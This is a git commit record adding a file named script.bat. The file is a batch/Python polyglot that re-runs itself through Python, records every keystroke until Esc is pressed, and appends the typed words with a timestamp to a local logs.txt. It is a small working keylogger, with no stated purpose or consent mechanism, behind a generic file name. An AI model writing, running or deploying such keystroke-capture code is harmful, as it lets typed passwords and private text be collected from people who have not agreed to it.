22397c38403ddaecf8f395cd17f8cfe65e611a4f
Darpan <darpanpal7@gmail.com>
2020-04-28 21:04:44 +0530

    Initial Commit

---
+++ script.bat
@@ -0,0 +1,19 @@
+@echo off & python -x "%~f0" %* & goto :eof
+
+import sys
+import keyboard
+import datetime
+
+gen = keyboard.get_typed_strings(keyboard.record(until='Esc'))
+l = []
+for i in gen :
+    l.append(i)
+
+s = l[0]
+l = s.split()
+file = open("logs.txt", "a")
+today = datetime.datetime.now().strftime("%I:%M%p on %B %d, %Y\n")
+file.write(today)
+for i in l :
+    file.write(i + "\n")
+file.close();
